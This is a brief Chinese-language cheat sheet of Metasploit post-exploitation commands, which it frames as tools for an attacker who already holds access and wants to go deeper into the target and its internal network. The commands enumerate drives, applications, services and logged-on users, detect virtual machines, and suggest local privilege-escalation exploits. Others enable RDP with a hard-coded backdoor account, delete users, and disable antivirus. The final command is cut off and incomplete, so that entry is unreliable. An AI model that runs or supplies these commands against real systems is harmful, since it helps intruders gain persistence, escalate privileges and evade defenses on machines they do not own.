## 一、介绍

```php
	post（后渗透模块），在攻击者拿到权限后，用于进一步对目标和内网进行渗透。
```



## 二、常用命令

### 1、获取目标分区情况

```php
	run post/windows/gather/forensics/enum_drives
```

### 2、检测是否是虚拟主机

```
	run post/windows/gather/checkvm
```

### 3、获取当前安装的应用程序

```
	run post/windows/gather/enum_applications
```

### 4、获取用户登录信息

```
	run post/windows/gather/enum_logged_on_users
```

### 5、对目标进行漏洞扫描

```
	run post/multi/recon/local_exploit_suggester
```

### 6、收集系统环境信息

```
	run post/multi/gather/env
```

### 7、查看开启服务

```
	run post/windows/gather/enum_services
```

### 8、查看目标主机最近的操作

```
	run post/windows/gather/dumplinks
```

### 9、添加用户

```
	run post/windows/manage/enable_rdp USERNAME=zmsn PASSWORD=zmsn
```

### 10、删除用户

```
	run post/windows/manage/delete_user username=zmsn
```

### 11、关闭杀软

```
	windows/manage/k
```

